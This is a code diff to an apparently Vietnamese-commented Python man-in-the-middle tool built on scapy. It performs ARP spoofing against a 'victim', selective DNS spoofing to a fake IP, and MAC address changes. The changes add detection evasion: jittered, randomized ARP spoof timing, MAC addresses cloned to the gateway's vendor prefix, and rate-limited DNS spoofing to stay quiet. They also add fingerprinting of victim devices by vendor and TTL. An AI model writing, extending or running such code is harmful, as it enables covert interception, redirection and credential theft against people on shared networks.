@@ -9,10 +9,8 @@ import netifaces as ni
 import sys, os, time, threading, subprocess, platform, json, urllib.parse
 from datetime import datetime
 from collections import defaultdict, deque
-from http.server import HTTPServer, BaseHTTPRequestHandler
 from pathlib import Path
 import random
-import struct
 
 # Rich imports
 from rich.console import Console
@@ -25,7 +23,6 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 from rich.text import Text
 from rich.align import Align
 from rich.columns import Columns
-from rich.tree import Tree
 
 # Windows specific
 if platform.system() == "Windows":
@@ -327,45 +324,48 @@ class AdaptiveARPSpoofer:
         self.running = False
         
         # Adaptive parameters
-        self.min_interval = 1.0  # Active user
-        self.max_interval = 5.0  # Idle user
-        self.current_interval = 2.0
+        self.min_interval = 0.5  # Lower minimum for more randomization
+        self.max_interval = 7.0  # Higher maximum for more randomization
+        self.current_interval = random.uniform(self.min_interval, self.max_interval)
         self.last_activity = time.time()
         self.activity_threshold = 10  # seconds
+        self.jitter = 0.3  # Jitter factor (seconds)
     
     def update_activity(self):
         """Cập nhật thời gian activity"""
         self.last_activity = time.time()
-        
-        # Giảm interval khi active
-        self.current_interval = max(self.min_interval, self.current_interval * 0.9)
+        # Giảm interval khi active, add randomization
+        self.current_interval = max(self.min_interval, self.current_interval * random.uniform(0.7, 0.95))
+        # Add jitter
+        self.current_interval += random.uniform(-self.jitter, self.jitter)
+        self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
     
     def check_idle(self):
         """Kiểm tra nếu victim idle"""
         idle_time = time.time() - self.last_activity
-        
         if idle_time > self.activity_threshold:
-            # Tăng interval khi idle
-            self.current_interval = min(self.max_interval, self.current_interval * 1.1)
+            # Tăng interval khi idle, add randomization
+            self.current_interval = min(self.max_interval, self.current_interval * random.uniform(1.05, 1.25))
+            # Add jitter
+            self.current_interval += random.uniform(-self.jitter, self.jitter)
+            self.current_interval = max(self.min_interval, min(self.current_interval, self.max_interval))
     
     def spoof(self):
         """Vòng lặp ARP spoofing adaptive"""
         self.running = True
-        
         while self.running:
             try:
                 # Kiểm tra idle status
                 self.check_idle()
-                
                 # Send ARP packets
                 send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip,
                         hwdst=self.victim_mac, hwsrc=self.my_mac), verbose=0)
                 send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip,
                         hwdst=self.gateway_mac, hwsrc=self.my_mac), verbose=0)
-                
-                # Sleep với interval adaptive
-                time.sleep(self.current_interval)
-                
+                # Sleep với interval adaptive + extra random jitter
+                sleep_time = self.current_interval + random.uniform(-self.jitter, self.jitter)
+                sleep_time = max(self.min_interval, min(sleep_time, self.max_interval))
+                time.sleep(sleep_time)
             except Exception as e:
                 console.print(f"[red]❌ Adaptive spoof error: {e}[/red]")
                 break
@@ -395,29 +395,38 @@ class MACRandomizer:
         self.iface = iface
         self.original_mac = get_if_hwaddr(iface)
     
-    def randomize(self, vendor='random'):
-        """Đổi MAC sang random hoặc vendor cụ thể"""
+    def randomize(self, vendor='random', gateway_mac=None):
+        """Đổi MAC sang random hoặc vendor cụ thể, hoặc theo gateway MAC"""
         try:
-            if vendor == 'random':
-                vendor = random.choice(list(self.VENDOR_PREFIXES.keys()))
-            
-            prefix = random.choice(self.VENDOR_PREFIXES.get(vendor, ['00:11:22']))
+            chosen_prefix = None
+            chosen_vendor = vendor
+            if gateway_mac:
+                # Extract vendor prefix from gateway MAC
+                prefix = ':'.join(gateway_mac.split(':')[:3])
+                # Try to match with known vendors
+                for v, prefixes in self.VENDOR_PREFIXES.items():
+                    if prefix in prefixes:
+                        chosen_prefix = prefix
+                        chosen_vendor = v
+                        break
+                if not chosen_prefix:
+                    chosen_prefix = prefix
+            else:
+                if vendor == 'random':
+                    chosen_vendor = random.choice(list(self.VENDOR_PREFIXES.keys()))
+                chosen_prefix = random.choice(self.VENDOR_PREFIXES.get(chosen_vendor, ['00:11:22']))
             suffix = ':'.join([f"{random.randint(0, 255):02x}" for _ in range(3)])
-            new_mac = f"{prefix}:{suffix}"
-            
+            new_mac = f"{chosen_prefix}:{suffix}"
             # Change MAC (platform specific)
             if platform.system() == 'Linux':
                 subprocess.run(['ifconfig', self.iface, 'down'], stderr=subprocess.DEVNULL)
                 subprocess.run(['ifconfig', self.iface, 'hw', 'ether', new_mac], stderr=subprocess.DEVNULL)
                 subprocess.run(['ifconfig', self.iface, 'up'], stderr=subprocess.DEVNULL)
-                
-                console.print(f"[green]✅ MAC changed: {self.original_mac} -> {new_mac} ({vendor})[/green]")
+                console.print(f"[green]✅ MAC changed: {self.original_mac} -> {new_mac} ({chosen_vendor})[/green]")
                 return True, new_mac
-            
             else:
                 console.print("[yellow]⚠️ MAC randomization chỉ hỗ trợ Linux[/yellow]")
                 return False, self.original_mac
-                
         except Exception as e:
             console.print(f"[red]❌ MAC randomization failed: {e}[/red]")
             return False, self.original_mac
@@ -437,11 +446,14 @@ class MACRandomizer:
 class SelectiveDNSSpoofer:
     """DNS Spoofing cho danh sách domain cụ thể"""
     
-    def __init__(self, target_domains, fake_ip):
+    def __init__(self, target_domains, fake_ip, rate_limit_per_domain=5, rate_limit_window=10):
         self.target_domains = target_domains  # List of domains to spoof
         self.fake_ip = fake_ip
         self.spoofed_queries = defaultdict(int)
         self.running = False
+        self.rate_limit_per_domain = rate_limit_per_domain
+        self.rate_limit_window = rate_limit_window  # seconds
+        self.domain_timestamps = defaultdict(deque)  # domain: deque of timestamps
     
     def should_spoof(self, domain):
         """Kiểm tra nếu domain cần spoof"""
@@ -451,29 +463,35 @@ class SelectiveDNSSpoofer:
         return False
     
     def spoof_dns(self, pkt):
-        """Xử lý DNS query"""
+        """Xử lý DNS query với rate limit"""
         if not self.running or not pkt.haslayer(DNSQR):
             return
-        
         try:
             query = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
-            
             # Chỉ spoof nếu trong target list
             if self.should_spoof(query):
-                fake_dns = (
-                    Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
-                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
-                    UDP(sport=53, dport=pkt[UDP].sport) /
-                    DNS(
-                        id=pkt[DNS].id,
-                        qr=1, aa=1, qd=pkt[DNS].qd,
-                        an=DNSRR(rrname=query, ttl=10, rdata=self.fake_ip)
+                now = time.time()
+                timestamps = self.domain_timestamps[query]
+                # Remove old timestamps
+                while timestamps and now - timestamps[0] > self.rate_limit_window:
+                    timestamps.popleft()
+                if len(timestamps) < self.rate_limit_per_domain:
+                    fake_dns = (
+                        Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
+                        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
+                        UDP(sport=53, dport=pkt[UDP].sport) /
+                        DNS(
+                            id=pkt[DNS].id,
+                            qr=1, aa=1, qd=pkt[DNS].qd,
+                            an=DNSRR(rrname=query, ttl=10, rdata=self.fake_ip)
+                        )
                     )
-                )
-                
-                send(fake_dns, verbose=0)
-                self.spoofed_queries[query] += 1
-                console.print(f"[red]🎯 DNS Spoofed (Selective):[/red] {query} → {self.fake_ip}")
+                    send(fake_dns, verbose=0)
+                    self.spoofed_queries[query] += 1
+                    timestamps.append(now)
+                    console.print(f"[red]🎯 DNS Spoofed (Selective):[/red] {query} → {self.fake_ip}")
+                else:
+                    console.print(f"[yellow]⏳ DNS spoof rate limit reached for {query}[/yellow]")
         except:
             pass
     
@@ -516,6 +534,7 @@ class AdvancedDashboard:
         }
         
         # Traffic sparkline data
+        self.device_identifier = DeviceIdentifier()
         self.traffic_history = deque(maxlen=50)  # Last 50 seconds
         self.last_packet_count = 0
         
@@ -713,7 +732,82 @@ Alerts: {len(self.stats.get('sensitive_alerts', []))}
         """Dừng dashboard"""
         self.running = False
 
-# ==================== ENHANCED ATTACKER ====================
+
+class DeviceIdentifier:
+    """Identify device vendor and type from MAC and heuristics (offline OUI lookup)."""
+    # Minimal OUI database (expandable)
+    OUI_DB = {
+        # Apple
+        '00:03:93': ('Apple', 'Phone/Laptop'),
+        '00:05:02': ('Apple', 'Phone/Laptop'),
+        '00:0a:95': ('Apple', 'Phone/Laptop'),
+        '00:0d:93': ('Apple', 'Phone/Laptop'),
+        # Samsung
+        '00:16:6c': ('Samsung', 'Android Phone'),
+        'f0:27:65': ('Samsung', 'Android Phone'),
+        # Intel
+        '00:13:e8': ('Intel', 'Laptop/PC'),
+        '00:1b:21': ('Intel', 'Laptop/PC'),
+        # Cisco
+        '00:40:96': ('Cisco', 'Network Device'),
+        '00:0f:f7': ('Cisco', 'Network Device'),
+        # TP-Link
+        'b0:4e:26': ('TP-Link', 'Router'),
+        'f4:f2:6d': ('TP-Link', 'Router'),
+        # MikroTik
+        '4c:5e:0c': ('MikroTik', 'Network Device'),
+        # Dell
+        '00:14:22': ('Dell', 'Laptop/PC'),
+        # HP
+        '00:1f:29': ('HP', 'Laptop/PC'),
+        # Lenovo
+        '00:21:5c': ('Lenovo', 'Laptop/PC'),
+        # Generic
+        '00:11:22': ('Unknown Vendor', 'Unknown'),
+    }
+
+    def __init__(self, extra_oui_db=None):
+        self.oui_db = dict(self.OUI_DB)
+        if extra_oui_db:
+            self.oui_db.update(extra_oui_db)
+
+    def lookup_vendor(self, mac):
+        """Return (vendor, default_type) from MAC address OUI."""
+        if not mac or len(mac) < 8:
+            return ("Unknown Vendor", "Unknown")
+        oui = mac.lower()[0:8]
+        oui = oui.replace('-', ':')
+        return self.oui_db.get(oui, ("Unknown Vendor", "Unknown"))
+
+    def infer_type(self, vendor, ttl=None):
+        """Heuristically infer device type from vendor and TTL."""
+        if vendor == 'Apple':
+            if ttl is not None and 60 <= ttl <= 70:
+                return 'iPhone/iPad'
+            elif ttl is not None and 120 <= ttl <= 130:
+                return 'Mac'
+            else:
+                return 'Apple Device'
+        if vendor == 'Samsung':
+            return 'Android Phone'
+        if vendor in ('Intel', 'Dell', 'HP', 'Lenovo'):
+            return 'Laptop/PC'
+        if vendor in ('Cisco', 'MikroTik', 'TP-Link'):
+            return 'Network Device'
+        return 'Unknown'
+
+    def identify(self, ip, mac, ttl=None):
+        vendor, default_type = self.lookup_vendor(mac)
+        device_type = self.infer_type(vendor, ttl) if vendor != 'Unknown Vendor' else default_type
+        return {
+            'ip': ip,
+            'mac': mac,
+            'vendor': vendor,
+            'type': device_type
+        }
+    
+    
+    # ==================== ENHANCED ATTACKER ====================
 class EnhancedAttacker:
     """Core engine với tất cả tính năng nâng cao"""
     
@@ -942,10 +1036,9 @@ class EnhancedAttacker:
     def start(self, mode='mitm', randomize_mac=False, selective_dns_targets=None):
         """Khởi động attack với tất cả tính năng"""
         self.mode = mode
-        
         # MAC Randomization
         if randomize_mac and Confirm.ask("Randomize MAC address?"):
-            self.mac_randomizer.randomize()
+            self.mac_randomizer.randomize(gateway_mac=self.gateway_mac)
         
         # Setup dashboard
         self.dashboard = AdvancedDashboard(self)
@@ -969,9 +1062,12 @@ class EnhancedAttacker:
             
             # Selective DNS spoofing
             if selective_dns_targets:
+                # DNS spoof rate limit: 5 per 10 seconds per domain
                 self.selective_dns = SelectiveDNSSpoofer(
                     selective_dns_targets,
-                    self.get_my_ip()
+                    self.get_my_ip(),
+                    rate_limit_per_domain=5,
+                    rate_limit_window=10
                 )
                 self.selective_dns.start(self.iface)
             
